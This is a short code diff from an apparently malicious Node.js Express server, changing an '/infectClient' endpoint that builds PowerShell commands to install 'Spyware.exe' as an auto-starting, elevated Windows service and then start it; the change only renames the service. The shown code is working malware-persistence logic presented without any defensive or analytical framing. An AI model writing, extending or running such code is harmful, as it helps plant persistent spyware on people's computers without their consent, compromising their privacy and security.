@@ -48,8 +48,8 @@ app.post('/rename-file', (req, res) => {
 app.post('/infectClient', (req, res) => {
     try {
         const spywareExePath = path.join(process.env.USERPROFILE, 'Documents', 'Spyware.exe');
-        const installServCmd = `powershell -Command "Start-Process sc.exe -ArgumentList 'create SpywareService binPath= \\"${spywareExePath}\\" start= auto' -Verb runAs"`;
-        const startServCmd = `powershell -Command "Start-Process sc.exe -ArgumentList 'start SpywareService' -Verb runAs"`;
+        const installServCmd = `powershell -Command "Start-Process sc.exe -ArgumentList 'create Spyware binPath= \\"${spywareExePath}\\" start= auto' -Verb runAs"`;
+        const startServCmd = `powershell -Command "Start-Process sc.exe -ArgumentList 'start Spyware' -Verb runAs"`;
         console.log(process.env.USERPROFILE);
         exec(installServCmd, (err, stdout, stderr) => {
             if (err) {
